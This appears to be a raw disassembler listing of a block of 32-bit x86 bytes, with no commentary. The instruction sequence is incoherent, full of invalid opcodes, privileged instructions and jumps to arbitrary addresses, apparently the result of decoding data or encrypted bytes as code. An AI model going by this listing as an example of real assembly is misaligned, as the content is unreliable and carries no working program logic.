  40ad63:	js     0x40ad30
  40ad65:	mov    dh,0xf1
  40ad67:	(bad)  
  40ad68:	clc    
  40ad69:	data16 (bad) 
  40ad6b:	sbb    eax,0x19876d9e
  40ad70:	push   ebx
  40ad71:	(bad)  
  40ad72:	fstp   DWORD PTR [edi]
  40ad74:	repnz xor eax,0x1ae77aef
  40ad7a:	mov    ds:0xd6a67,al
  40ad7f:	dec    eax
  40ad80:	shl    edx,cl
  40ad82:	or     DWORD PTR [edx+0xb],eax
  40ad85:	or     al,BYTE PTR [edx+0x383f13d8]
  40ad8b:	test   al,0x78
  40ad8d:	inc    DWORD PTR [esi+ebx*4-0x2b28f068]
  40ad94:	mov    cl,0x87
  40ad96:	push   esi
  40ad97:	or     al,0xd2
  40ad99:	arpl   WORD PTR [ecx+0x74ef2941],cx
  40ad9f:	pop    esi
  40ada0:	(bad)  
  40ada1:	das    
  40ada2:	fld    DWORD PTR [eax-0x32b1faf8]
  40ada8:	into   
  40ada9:	ror    BYTE PTR [edx+0x200af64],1
  40adaf:	nop
  40adb0:	push   ds
  40adb1:	sbb    DWORD PTR [edx+0x32a0de7],eax
  40adb7:	enter  0xf1a1,0x4
  40adbb:	jge    0x40ad64
  40adbd:	aam    0x47
  40adbf:	fstp   TBYTE PTR [edx-0x160b0b56]
  40adc5:	sbb    al,0xed
  40adc7:	pusha  
  40adc8:	add    BYTE PTR [eax+0x651ff8b0],ch
  40adce:	out    0xcf,al
  40add0:	lods   al,BYTE PTR ds:[esi]
  40add1:	pop    esp
  40add2:	inc    ecx
  40add3:	addr16 (bad) 
  40add5:	imul   ebp,DWORD PTR [bx+si+0x42ab],0x1a1ef1b3
  40adde:	ds xchg edx,eax
  40ade0:	push   esi
  40ade1:	xor    ebp,esp
  40ade3:	jp     0x40ae44
  40ade5:	xor    eax,0xc3f6c033
  40adea:	fld    DWORD PTR [eax]
  40adec:	adc    BYTE PTR [esi],dh
  40adee:	jmp    0xd8b8d4b6
  40adf3:	pusha  
  40adf4:	push   es
  40adf5:	pop    es
  40adf6:	xor    eax,0x6b41f088
  40adfb:	scas   eax,DWORD PTR es:[edi]
  40adfc:	stc    
  40adfd:	fucomi st,st(4)
  40adff:	push   esp
  40ae00:	mov    ah,0x76
  40ae02:	jae    0x40ad93
  40ae04:	adc    al,0xb4
  40ae06:	inc    eax
  40ae07:	cli    
  40ae08:	sub    esp,DWORD PTR [edx-0x6dfa8cea]
  40ae0e:	aad    0xc9
  40ae10:	mov    BYTE PTR [eax+0x68],ch
  40ae13:	das    
  40ae14:	mov    esp,0xf759d717
  40ae19:	xor    eax,0xb37e9cc6
  40ae1e:	test   eax,0xd1947604
  40ae23:	pop    ebx
  40ae24:	pop    ebp
  40ae25:	aaa    
  40ae26:	dec    eax
  40ae27:	out    dx,eax
  40ae28:	xor    eax,DWORD PTR [edi]
  40ae2a:	and    BYTE PTR [ebp-0x7926d6e9],0xc
  40ae31:	or     ah,bl
  40ae33:	push   ss
  40ae34:	xor    cl,al
  40ae36:	ss adc al,bl
  40ae39:	mov    WORD PTR [edi+0x4b],gs
  40ae3c:	cmp    al,0x61
  40ae3e:	cmp    bh,BYTE PTR [esi-0x50]
  40ae41:	aas    
  40ae42:	ret    0xb240
  40ae45:	aad    0x62
  40ae47:	popa   
  40ae48:	stos   DWORD PTR es:[edi],eax
  40ae49:	mov    ebx,DWORD PTR [eax+0x5]
  40ae4c:	arpl   WORD PTR [edi],dx
  40ae4e:	je     0x40ae21
  40ae50:	(bad)  
  40ae51:	(bad)  
  40ae52:	int3   
  40ae53:	dec    eax
  40ae54:	cld    
  40ae55:	enter  0x9877,0x21
  40ae59:	nop
  40ae5a:	lar    esi,cx
  40ae5d:	jg     0x40adf1
  40ae5f:	sbb    DWORD PTR [eax],ebx
  40ae61:	sub    esp,DWORD PTR [ecx+0x9518301]
  40ae67:	not    DWORD PTR [ebp-0x46]
  40ae6a:	ds and ah,al
  40ae6d:	lock push cs
  40ae6f:	jno    0x40ae50
  40ae71:	xor    BYTE PTR [esi],bh
  40ae73:	or     dl,ch
  40ae75:	inc    ecx
  40ae76:	inc    ebp
  40ae77:	or     al,BYTE PTR [ebp+0x46f295a8]
  40ae7d:	pop    edi
  40ae7e:	xor    DWORD PTR [edx-0x50],eax
  40ae81:	and    ch,BYTE PTR [esi+0x50]
  40ae84:	add    dh,BYTE PTR [edx+0x3c0a1fa5]
  40ae8a:	imul   ebx,eax,0x5c
  40ae8d:	push   0x410622a5
  40ae92:	les    ebx,FWORD PTR [edi+ebp*2+0x3bcdb9e]
  40ae99:	add    dh,ch
  40ae9b:	ret    0xbb98
  40ae9e:	jge    0x40aeb4
  40aea0:	rol    BYTE PTR [bp+si+0x60],1
  40aea4:	dec    edi
  40aea5:	das    
  40aea6:	scas   eax,DWORD PTR es:[edi]
  40aea7:	rcl    BYTE PTR ds:0x8ecf2137,cl
  40aead:	and    al,0x39
  40aeaf:	and    al,0xce
  40aeb1:	lea    ebx,[edx+0x5e]
  40aeb4:	(bad)  
  40aeb6:	inc    edx
  40aeb7:	rol    DWORD PTR [esi],0x80
  40aeba:	and    ebp,DWORD PTR [ecx]
  40aebc:	inc    edi
  40aebd:	lea    edx,[esi+esi*8]
  40aec0:	dec    esp
  40aec1:	test   BYTE PTR [edx-0x38589003],cl
  40aec7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aec8:	inc    esp
  40aec9:	cli    
  40aeca:	cmc    
  40aecb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aecc:	sbb    BYTE PTR ss:[ebp+0x768373f1],al
  40aed3:	(bad)  
  40aed4:	pop    edi
  40aed5:	out    dx,eax
  40aed6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aed7:	call   0x207a8e7b
  40aedc:	xlat   BYTE PTR ds:[ebx]
  40aedd:	or     BYTE PTR [edx],0x10
  40aee0:	add    al,0x80
  40aee2:	xor    BYTE PTR [ebx],bh
  40aee4:	sar    BYTE PTR [eax+eax*2-0x77ec44e0],0xc2
  40aeec:	daa    
  40aeed:	inc    BYTE PTR [edi]
  40aeef:	hlt    
  40aef0:	add    al,0x36
  40aef2:	wbinvd 
  40aef4:	mov    edx,0x4c00019f
  40aef9:	mov    ebx,DWORD PTR [eax-0x58ec3c02]
  40aeff:	jmp    0x86951af1
  40af04:	pop    ss
  40af05:	fadd   QWORD PTR [ecx+0x74390d17]
  40af0b:	jb     0x40af01
  40af0d:	jmp    edi
  40af0f:	in     al,dx
  40af10:	cmp    eax,0xaeace3e0
  40af15:	hlt    
  40af16:	loope  0x40af5f
  40af18:	mov    ds:0xa48cd236,eax
  40af1d:	push   ecx
  40af1e:	scas   eax,DWORD PTR es:[edi]
  40af1f:	xchg   esi,eax
  40af20:	push   ebp
  40af21:	fdivr  QWORD PTR [ebx+0x5]
  40af24:	add    esi,DWORD PTR [esi]
  40af26:	aad    0xb4
  40af28:	ror    BYTE PTR [ecx-0x4e],1
  40af2b:	nop
  40af2c:	ins    BYTE PTR es:[edi],dx
  40af2d:	or     BYTE PTR [edi+eax*4-0x44de9914],ah
  40af34:	imul   edi,DWORD PTR [ebx-0x226d9137],0xd94d9364
  40af3e:	test   BYTE PTR [ebp+0xf],cl
  40af41:	pop    ecx
  40af42:	and    BYTE PTR ds:0x40804812,dl
  40af48:	adc    cl,BYTE PTR [edx+0x60db0609]
  40af4e:	rcl    BYTE PTR ds:0xb649b8db,0x6c
  40af55:	stos   DWORD PTR es:[edi],eax
  40af56:	xlat   BYTE PTR ds:[ebx]
  40af57:	xchg   ecx,eax
  40af58:	xor    al,0x1a
  40af5a:	lea    esp,[esi+0x46]
  40af5d:	xor    edi,edi
  40af5f:	sti    
  40af60:	pushf  
  40af61:	ja     0x40af51
  40af63:	clc    
  40af64:	into   
  40af65:	aad    0x2b
  40af67:	addr16 mov edi,0xa37efeef
  40af6d:	sbb    DWORD PTR [ebp+0x7d],ecx
  40af70:	outs   dx,DWORD PTR ds:[esi]
  40af71:	cmp    edi,esp
  40af73:	cmp    al,0xe7
  40af75:	cmp    edi,esp
  40af77:	sahf   
  40af78:	sbb    edx,DWORD PTR [ebp-0x7434ff43]
  40af7e:	repz xor BYTE PTR [esp+esi*1-0x7b],dl
  40af83:	(bad)  
  40af84:	leave  
  40af85:	sub    BYTE PTR [esi],bl
  40af87:	sbb    eax,0xb4aca38e
  40af8c:	aam    0x49
  40af8e:	cld    
  40af8f:	jmp    0xf61fdcce
  40af94:	call   DWORD PTR gs:[esi+edi*8]
  40af98:	ds pop esi
  40af9a:	xchg   ebx,eax
  40af9b:	xchg   ah,ah
  40af9d:	korb   k2,k3,k2
  40afa1:	imul   ebx,DWORD PTR [esi],0x473c60b
  40afa7:	push   esi
  40afa8:	cmc    
  40afa9:	(bad)  
  40afaa:	bound  edx,QWORD PTR [edi-0x1761bde9]
  40afb0:	mov    ?,WORD PTR [ebp+0x60]
  40afb3:	jbe    0x40b027
  40afb5:	ret    
  40afb6:	in     al,dx
  40afb7:	(bad)  
  40afb8:	ins    BYTE PTR es:[edi],dx
  40afb9:	jle    0x40af9a
  40afbb:	ins    BYTE PTR es:[edi],dx
  40afbc:	int    0x8d
  40afbe:	in     al,0x33
  40afc0:	xor    eax,0x368c4dbc
  40afc5:	xor    al,0xe7
  40afc7:	and    bl,al
  40afc9:	adc    edx,DWORD PTR [ebx-0x5662ba94]
  40afcf:	test   al,0xaf
  40afd1:	test   DWORD PTR [edx],eax
  40afd3:	pop    esi
  40afd4:	sahf   
  40afd5:	dec    edx
  40afd6:	pop    es
  40afd7:	frstor [edi-0x2ad2c6cc]
  40afdd:	inc    ebp
  40afde:	jmp    0x52ab:0xabd5739b
  40afe5:	add    al,0xd6
  40afe7:	je     0x40b022
  40afe9:	lock xchg BYTE PTR [edx+0x16],dl
  40afed:	adc    eax,0x57545cfe
  40aff2:	cmp    DWORD PTR [ebp+0x71e1c38f],esi
  40aff8:	and    al,0x7b
  40affa:	inc    ebx
  40affb:	test   al,0x4c
  40affd:	aad    0x8b
  40afff:	or     al,0x26
  40b001:	popf   
  40b002:	fs call 0x86ed:0xfcae3571
  40b00a:	mov    BYTE PTR [ebx],dh
  40b00c:	stc    
  40b00d:	mov    edx,0x1237feb6
  40b012:	cdq    
  40b013:	adc    ebp,DWORD PTR [ebp-0x4ba33efb]
  40b019:	test   dl,0x76
  40b01c:	mov    bl,0x8a
  40b01e:	mov    dh,0x30
  40b020:	mov    eax,0xd55a6f3d
  40b025:	fld    st(6)
  40b027:	mov    BYTE PTR [ebx-0x5d],ah
  40b02a:	cmp    DWORD PTR [eax-0x238cbd58],eax
  40b030:	or     esi,DWORD PTR [eax]
  40b032:	call   0xdeb1:0xe00a2b9d
  40b039:	jno    0x40b09c
  40b03b:	test   DWORD PTR [ebp+0x8],0x811567bc
  40b042:	outs   dx,BYTE PTR ds:[esi]
  40b043:	mov    eax,ds:0x9f964114
  40b048:	push   edx
  40b049:	add    BYTE PTR [edx+0x17],bh
  40b04c:	and    BYTE PTR [ebx+0x27],bl
  40b04f:	jle    0xbf4645a2
  40b055:	xor    ch,al
  40b057:	xchg   esp,eax
  40b058:	push   es
  40b059:	jnp    0x40b002
  40b05b:	sar    DWORD PTR [edi+0x5b],1
  40b05e:	add    DWORD PTR [eax+0x226600b7],ebx
  40b064:	les    esi,FWORD PTR [ebx+0x59]
  40b067:	jbe    0x40b024
  40b069:	out    dx,eax
  40b06a:	popf   
  40b06b:	cs cdq 
  40b06d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b06e:	jmp    DWORD PTR [ebp+0x2]
  40b072:	xchg   esp,eax
  40b073:	or     al,BYTE PTR [eax+0x4a23c9ae]
  40b079:	nop
  40b07a:	cmp    DWORD PTR [ebp-0x1bfc0ded],ecx
  40b080:	mov    cl,0xbc
  40b082:	xchg   edx,eax
  40b083:	fcom   st(3)
  40b085:	adc    eax,0xc07d42cc
  40b08a:	push   ecx
  40b08b:	jl     0x40b01e
  40b08d:	mov    bl,0x71
  40b08f:	xor    eax,0x293c3e41
  40b094:	test   al,0x83
  40b096:	cs add bh,al
  40b099:	and    al,ah
  40b09b:	mov    al,0x1e
  40b09d:	mov    esi,0x17b8338e
  40b0a2:	ret    0xc20f
  40b0a5:	pop    ds
  40b0a6:	dec    ecx
  40b0a7:	and    DWORD PTR [eax],ebx
  40b0a9:	cmc    
  40b0aa:	clc    
  40b0ab:	mov    ds:0x3d59fbea,eax
  40b0b0:	call   0xfee13d26
  40b0b5:	sub    al,bh
  40b0b7:	add    eax,0x99912a78
  40b0bc:	sub    al,0x67
  40b0be:	xchg   DWORD PTR [ebx],eax
  40b0c0:	gs pushf 
  40b0c2:	ins    DWORD PTR es:[edi],dx
  40b0c3:	add    eax,0x1d800e60
  40b0c8:	fidiv  WORD PTR [ecx]
  40b0ca:	cmp    esp,DWORD PTR [edi+0x2e8d9ef]
  40b0d0:	mov    esp,0x9e68ea58
  40b0d5:	ja     0x40b082
  40b0d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0d8:	aas    
  40b0d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0da:	sub    al,0x3d
  40b0dc:	or     DWORD PTR [edi],edi
  40b0de:	adc    al,BYTE PTR [eax+0x3474d12c]
  40b0e4:	xchg   esi,eax
  40b0e5:	test   DWORD PTR [ebp+0x78e60ab9],eax
  40b0eb:	mov    bl,0x71
  40b0ed:	bound  esp,QWORD PTR [edx-0x4d558d00]
  40b0f3:	xor    DWORD PTR [eax],edi
  40b0f5:	cdq    
  40b0f6:	(bad)  
  40b0f7:	jmp    0x3a54f6c
  40b0fc:	jbe    0x40b128
  40b0fe:	or     ebx,DWORD PTR [edi-0x5d]
  40b101:	es cmc 
  40b103:	repz pop esi
  40b105:	(bad)  
  40b106:	dec    esi
  40b107:	scas   eax,DWORD PTR es:[edi]
  40b108:	push   ebp
  40b109:	xchg   ebx,eax
  40b10a:	pop    esi
  40b10b:	and    BYTE PTR [ecx],ch
  40b10d:	lahf   
  40b10e:	jne    0x40b0a1
  40b110:	xor    BYTE PTR [edx-0x6f277a43],bh
  40b116:	cmp    eax,DWORD PTR [ebp+0x2961e3e5]
  40b11c:	adc    bh,dl
  40b11e:	xor    al,0xf3
  40b120:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b121:	push   ebx
  40b122:	adc    eax,0xd94eed61
  40b127:	shl    BYTE PTR [esi+0x36],1
  40b12a:	pop    edi
  40b12b:	into   
  40b12c:	cld    
  40b12d:	fistp  WORD PTR [esi+0x7549b760]
  40b133:	inc    ebx
  40b134:	inc    ecx
  40b135:	mov    esp,0x40ee5e5f
  40b13a:	jns    0x40b123
  40b13c:	jge    0x40b197
  40b13e:	or     BYTE PTR [esi-0x304e31ee],al
  40b144:	adc    DWORD PTR [edi+0x49],eax
  40b147:	outs   dx,BYTE PTR ds:[esi]
  40b148:	push   eax
  40b149:	call   0xf794b33
  40b14e:	jae    0x40b158
  40b150:	mov    BYTE PTR [eax+0x2ecefcc7],dh
  40b156:	(bad)  
  40b157:	and    ebp,esp
  40b159:	out    0x84,al
  40b15b:	adc    al,0xd2
  40b15d:	sub    DWORD PTR [ecx-0x3],ecx
  40b160:	push   es
  40b161:	xchg   ebx,eax
  40b162:	pop    ebp
  40b163:	leave  
  40b164:	jg     0x40b182
  40b166:	or     cl,BYTE PTR ds:0xd2583f8b
  40b16c:	pop    eax
  40b16d:	(bad)  
  40b16e:	and    ebp,esp
  40b170:	dec    edx
  40b171:	popf   
  40b172:	dec    esi
  40b173:	test   DWORD PTR [ecx+ebp*4-0x453246fc],edi
  40b17a:	xor    al,0x99
  40b17c:	test   esp,eax
  40b17e:	clc    
  40b17f:	xor    al,0x5a
  40b181:	jge    0x40b1e4
  40b183:	adc    al,0x67
  40b185:	stc    
  40b186:	push   ecx
  40b187:	test   eax,0x3910dfde
  40b18c:	cmp    ecx,DWORD PTR [edi-0x71]
  40b18f:	popa   
  40b190:	imul   BYTE PTR [eax-0x2c2a6478]
  40b196:	std    
  40b197:	aam    0x63
  40b199:	pop    ss
  40b19a:	inc    eax
  40b19b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b19c:	cmp    BYTE PTR [ebx-0xc0cf4d7],0xfa
  40b1a3:	fidiv  WORD PTR [esi-0x75]
  40b1a6:	mov    esp,0x18111ac6
  40b1ab:	pop    esp
  40b1ac:	mov    eax,ds:0x3c2153a4
  40b1b1:	mov    edx,0x7c73e340
  40b1b6:	mov    dl,0x2d
  40b1b8:	xchg   esi,eax
  40b1b9:	daa    
  40b1ba:	inc    ebp
  40b1bb:	jae    0x40b190
  40b1bd:	sbb    BYTE PTR ds:0xfc00bb5f,al
  40b1c3:	pushf  
  40b1c4:	or     BYTE PTR [ebp-0x1c8137a6],al
  40b1ca:	(bad)  
  40b1cb:	push   esp
  40b1cc:	not    ebx
  40b1ce:	and    eax,0x218d9e6
  40b1d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1d4:	loop   0x40b1d2
  40b1d6:	jb     0x40b19c
  40b1d8:	fst    DWORD PTR [ebx+eax*2-0x7c]
  40b1dc:	mov    eax,ds:0xa923c009
  40b1e1:	neg    eax
  40b1e3:	outs   dx,BYTE PTR ds:[esi]
  40b1e4:	push   eax
  40b1e5:	shr    dl,1
  40b1e7:	or     DWORD PTR [ecx+0x33b46c68],0x1b
  40b1ee:	and    dh,BYTE PTR [edx]
  40b1f0:	inc    ebx
  40b1f1:	lahf   
  40b1f2:	idiv   BYTE PTR [edx+0x726dfb31]
  40b1f8:	and    BYTE PTR [esi+eiz*8-0x5f],ah
  40b1fc:	mov    ebx,es
  40b1fe:	jnp    0x40b246
  40b200:	jl     0x40b1e4
  40b202:	call   DWORD PTR [ebx-0x3e1f5711]
  40b208:	cmp    edx,ebp
  40b20a:	fisttp QWORD PTR ds:0x89e01dca
  40b210:	fcmovb st,st(2)
  40b212:	push   0x45
  40b214:	mov    esp,0x5f48e152
  40b219:	pop    es
  40b21a:	push   ecx
  40b21b:	inc    eax
  40b21c:	xchg   ebp,eax
  40b21d:	iret   
  40b21e:	leave  
  40b21f:	mov    dl,BYTE PTR [ebp-0x7deaacfd]
  40b225:	out    0x41,al
  40b227:	mov    eax,ds:0x8a25d18f
  40b22c:	pushf  
  40b22d:	mov    ebp,0xd965538e
  40b232:	clc    
  40b233:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b234:	jo     0x40b1e4
  40b236:	push   edx
  40b237:	cs pop esi
  40b239:	sbb    edi,eax
  40b23b:	iret   
  40b23c:	push   es
  40b23d:	jnp    0x40b2b0
  40b23f:	dec    ecx
  40b240:	mov    al,BYTE PTR [esp+ebx*4]
  40b243:	dec    ebp
  40b244:	add    DWORD PTR [esp+ebp*4+0x7e],eax
  40b248:	fs pushf 
  40b24a:	push   cs
  40b24b:	ins    BYTE PTR es:[edi],dx
  40b24c:	xor    edx,edi
  40b24e:	mov    dh,0xbf
  40b250:	stos   DWORD PTR es:[edi],eax
  40b251:	cmp    esp,DWORD PTR [esi+0x2a]
  40b254:	xor    BYTE PTR [ebx],0x15
  40b257:	gs clc 
  40b259:	push   esi
  40b25a:	cmp    al,0x5f
  40b25c:	pop    esi
  40b25d:	mov    edi,0x9d0a66b4
  40b262:	adc    DWORD PTR [ebx],0x38
  40b265:	scas   eax,DWORD PTR es:[edi]
  40b266:	mov    cl,0x18
  40b268:	pop    ss
  40b269:	push   ss
  40b26a:	js     0x40b25c
  40b26c:	mov    dh,BYTE PTR [edi]
  40b26e:	stos   BYTE PTR es:[edi],al
  40b26f:	adc    BYTE PTR [eax-0x6a],al
  40b272:	in     al,dx
  40b273:	or     DWORD PTR [eax],esp
  40b275:	and    bl,BYTE PTR [eax]
  40b277:	hlt    
  40b278:	push   esp
  40b279:	pusha  
  40b27a:	pop    ecx
  40b27b:	mov    ebp,0x9e34282
  40b280:	or     al,0x64
  40b282:	jnp    0x40b2c9
  40b284:	add    esp,ebx
  40b286:	rol    BYTE PTR ds:[ebx-0xe38f535],1
  40b28d:	cmc    
  40b28e:	mov    esp,0xdcf85966
  40b293:	pop    ds
  40b294:	sar    BYTE PTR [edx-0x584c5419],0xa5
  40b29b:	enter  0x35c8,0x5
  40b29f:	stc    
  40b2a0:	sub    bl,ch
  40b2a2:	sbb    DWORD PTR [edi-0x4b],eax
  40b2a5:	ret    0x3ad5
  40b2a8:	in     al,0xa1
  40b2aa:	cmp    esp,DWORD PTR [ebp-0x5]
  40b2ad:	outs   dx,BYTE PTR ss:[esi]
  40b2af:	adc    ebp,DWORD PTR [edx-0x49]
  40b2b2:	mov    edi,0xd98004a6
  40b2b7:	jge    0x40b336
  40b2b9:	lods   eax,DWORD PTR ds:[esi]
  40b2ba:	add    al,0xd7
  40b2bc:	push   ebp
  40b2bd:	mov    DWORD PTR fs:[edi],edi
  40b2c0:	retf   
  40b2c1:	sub    al,dh
  40b2c3:	cmp    al,0xfe
  40b2c5:	jns    0x40b2f7
  40b2c7:	mov    DWORD PTR [ebx-0xf1c8479],0x25972b15
  40b2d1:	push   eax
  40b2d2:	sub    ah,bh
  40b2d4:	sbb    al,0xb0
  40b2d6:	add    ch,BYTE PTR ds:[ebx-0x1c702edc]
  40b2dd:	inc    esi
  40b2de:	test   eax,0x52a731f6
  40b2e3:	and    eax,0x325b0217
  40b2e8:	xchg   ebp,eax
  40b2e9:	retf   0xa631
  40b2ec:	adc    al,0x23
  40b2ee:	mov    bh,0x81
  40b2f0:	div    BYTE PTR [edi-0x58006ce1]
  40b2f6:	imul   ebx,DWORD PTR [edx-0x2d97f82d],0xffffffad
  40b2fd:	and    dh,cl
  40b2ff:	ret    
  40b300:	add    al,0xa9
  40b302:	mov    esi,0xfe68b8d1
  40b307:	sub    al,0xb5
  40b309:	adc    BYTE PTR [edx],ch
  40b30b:	and    cl,BYTE PTR [ecx+0x9]
  40b30e:	and    eax,0xeb3915dd
  40b313:	pop    es
  40b314:	ds or  eax,0x8f47c277
  40b31a:	mov    ebx,DWORD PTR [ebp-0x7df49bf0]
  40b320:	fistp  DWORD PTR [eax-0x64]
  40b323:	or     ebp,DWORD PTR [ecx]
  40b325:	fldz   
  40b327:	xchg   edx,eax
  40b328:	mov    esi,0x1cd37d7
  40b32d:	mov    esp,0xf10b3cb3
  40b332:	lds    edi,FWORD PTR [esi]
  40b334:	fst    DWORD PTR [eax]
  40b336:	je     0x40b35e
  40b338:	nop
  40b339:	das    
  40b33a:	test   DWORD PTR [ecx],esi
  40b33c:	pop    esi
  40b33d:	call   0x117b43df
  40b342:	mov    ah,0x7c
  40b344:	jle    0x40b335
  40b346:	fstp   DWORD PTR [edi+0x68]
  40b349:	repnz out 0xa5,al
  40b34c:	dec    ecx
  40b34d:	inc    ecx
  40b34e:	ss int 0xf8
  40b351:	push   edi
  40b352:	dec    eax
  40b353:	adc    dl,al
  40b355:	test   al,0xf0
  40b357:	add    ebp,esp
  40b359:	test   eax,0x1c5f44cd
  40b35e:	je     0x40b30a
  40b360:	add    dl,BYTE PTR [ecx]
  40b362:	ins    DWORD PTR es:[edi],dx
  40b363:	in     eax,dx
  40b364:	ret    
  40b365:	dec    esp
  40b366:	ds dec eax
  40b368:	das    
  40b369:	je     0x40b3be
  40b36b:	leave  
  40b36c:	std    
  40b36d:	jg     0x40b3e4
  40b36f:	add    ecx,esp
  40b371:	xlat   BYTE PTR ds:[ebx]
  40b372:	ins    BYTE PTR es:[edi],dx
  40b373:	mov    ds:0x10f76d8,al
  40b378:	ja     0x40b37e
  40b37a:	inc    eax
  40b37b:	in     eax,0xb4
  40b37d:	lods   eax,DWORD PTR ds:[esi]
  40b37e:	mov    eax,0x8cf70e4c
  40b383:	and    esp,DWORD PTR [edx]
  40b385:	inc    ebp
  40b386:	dec    edi
  40b387:	jns    0x40b323
  40b389:	push   ecx
  40b38a:	jns    0x40b376
  40b38c:	rcr    BYTE PTR [edx+ebx*2],1
  40b38f:	outs   dx,BYTE PTR ds:[esi]
  40b390:	daa    
  40b391:	sub    al,0xe8
  40b393:	inc    ebp
  40b394:	push   ebx
  40b395:	ror    BYTE PTR [ecx-0x1e6bdc00],0xe3
  40b39c:	adc    eax,ebp
  40b39e:	inc    esp
  40b39f:	enter  0x35c,0x3c
  40b3a3:	cs ins BYTE PTR es:[edi],dx
  40b3a5:	xchg   ecx,eax
  40b3a6:	inc    edx
  40b3a7:	push   cs
  40b3a8:	push   esp
  40b3a9:	jp     0x40b348
  40b3ab:	sub    ebx,ebp
  40b3ad:	jg     0x40b33f
  40b3af:	fucomip st,st(5)
  40b3b1:	iret   
  40b3b2:	ret    
  40b3b3:	arpl   WORD PTR [ecx],sp
  40b3b5:	(bad)  
  40b3b6:	in     al,0xe
  40b3b8:	mov    al,0xdd
  40b3ba:	scas   eax,DWORD PTR es:[edi]
  40b3bb:	(bad)  
  40b3bc:	xchg   BYTE PTR [esi],ah
  40b3be:	add    DWORD PTR [ebp+0x5],ebp
  40b3c1:	pusha  
  40b3c2:	mov    cs,WORD PTR [ecx+0x206718a9]
  40b3c8:	add    BYTE PTR [ebx+0x20],dh
  40b3cb:	dec    esp
  40b3cc:	and    DWORD PTR [eax-0x20df168f],ebp
  40b3d2:	icebp  
  40b3d3:	cmp    eax,0xdab2800a
  40b3d8:	test   ah,ch
  40b3da:	xlat   BYTE PTR ds:[ebx]
  40b3db:	xchg   edi,eax
  40b3dc:	mov    eax,cs
  40b3de:	mov    bl,0xcb
  40b3e0:	retf   0x4f2
  40b3e3:	add    eax,0x9c3a7c3c
  40b3e8:	ficomp WORD PTR [edx]
  40b3ea:	int3   
  40b3eb:	push   ss
  40b3ec:	sub    eax,0x8ff215af
  40b3f1:	and    eax,eax
  40b3f3:	ins    DWORD PTR es:[edi],dx
  40b3f4:	fnsave [ecx]
  40b3f6:	cld    
  40b3f7:	jo     0x40b3f5
  40b3f9:	mov    eax,0x5afdf36c
  40b3fe:	jmp    0x40b3a2
  40b400:	hlt    
  40b401:	jnp    0x40b42b
  40b403:	cld    
  40b404:	and    al,0xfe
  40b406:	xchg   BYTE PTR [ebx],cl
  40b408:	jge    0x40b3f2
  40b40a:	sahf   
  40b40b:	mov    ah,BYTE PTR [edx-0x27]
  40b40e:	je     0x40b41c
  40b410:	ja     0x40b41f
  40b412:	cmp    BYTE PTR [ebx+eiz*4-0x26cd0932],cl
  40b419:	int    0xff
  40b41b:	aas    
  40b41c:	or     DWORD PTR [eax+0x6e],eax
  40b41f:	or     ebx,ebx
  40b421:	xchg   ch,bh
  40b423:	es aam 0x37
  40b426:	sti    
  40b427:	mov    esi,0x5186f52c
  40b42c:	test   ecx,ebp
  40b42e:	mul    BYTE PTR [ebp+edx*4-0x1f]
  40b432:	adc    al,0xcb
  40b434:	pop    eax
  40b435:	gs out 0xcb,eax
  40b438:	and    al,0xc5
  40b43a:	mov    ebp,0xe5f7c865
  40b43f:	pusha  
  40b440:	ins    BYTE PTR es:[edi],dx
  40b441:	push   0x93c0353c
  40b446:	enter  0x3f56,0x56
  40b44a:	test   eax,0x553b3626
  40b44f:	sbb    BYTE PTR [ebp+0x70903deb],dl
  40b455:	scas   al,BYTE PTR es:[edi]
  40b456:	mov    ah,0x3d
  40b458:	call   0xead9:0x47c26af
  40b45f:	push   edi
  40b460:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b461:	cmc    
  40b462:	aad    0x47
  40b464:	and    dh,BYTE PTR [edx-0x595c5b8f]
  40b46a:	dec    esi
  40b46b:	retf   0xf48
  40b46e:	leave  
  40b46f:	push   ebx
  40b470:	or     ebp,esp
  40b472:	and    edi,DWORD PTR [ebx-0x5c]
  40b475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b476:	xor    al,0x13
  40b478:	dec    ecx
  40b479:	out    0xa9,al
  40b47b:	icebp  
  40b47c:	test   BYTE PTR [edi],0x93
  40b47f:	adc    bl,BYTE PTR [edi]
  40b481:	jmp    FWORD PTR [eax-0x3c]
  40b484:	jno    0x40b4b9
  40b486:	hlt    
  40b487:	pop    ecx
  40b488:	mov    DWORD PTR [esi+0xa],ebp
  40b48b:	rol    BYTE PTR [esi+0x46],0x6e
  40b48f:	ds mov ebp,0x1af01adb
  40b495:	lahf   
  40b496:	xadd   BYTE PTR [ebp+0x1351bcd9],bh
  40b49d:	lods   al,BYTE PTR ds:[esi]
  40b49e:	jge    0x40b491
  40b4a0:	jmp    0x3765:0xf35a4bc9
  40b4a7:	daa    
  40b4a8:	mov    ds:0x45156d47,eax
  40b4ad:	xchg   edx,eax
  40b4ae:	sub    al,0xc6
  40b4b0:	inc    esi
  40b4b1:	clc    
  40b4b2:	dec    edi
  40b4b3:	sub    edi,DWORD PTR [eax+0x4741cebe]
  40b4b9:	lods   al,BYTE PTR ds:[esi]
  40b4ba:	sti    
  40b4bb:	inc    edi
  40b4bc:	adc    dh,BYTE PTR [eax+0x32]
  40b4bf:	lds    eax,FWORD PTR [ecx]
  40b4c1:	lock ja 0x40b4ef
  40b4c4:	push   edx
  40b4c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4c6:	lahf   
  40b4c7:	jae    0x40b52d
  40b4c9:	push   esi
  40b4ca:	add    al,0xb7
  40b4cc:	inc    edi
  40b4cd:	pushf  
  40b4ce:	lea    esi,ds:0x5376109a
  40b4d4:	jp     0x40b544
  40b4d6:	call   0xb44d42a2
  40b4db:	xchg   ebp,eax
  40b4dc:	pushf  
  40b4dd:	jmp    0xf2366d08
  40b4e2:	pop    esp
  40b4e3:	and    al,0xa8
  40b4e5:	in     eax,dx
  40b4e6:	push   ss
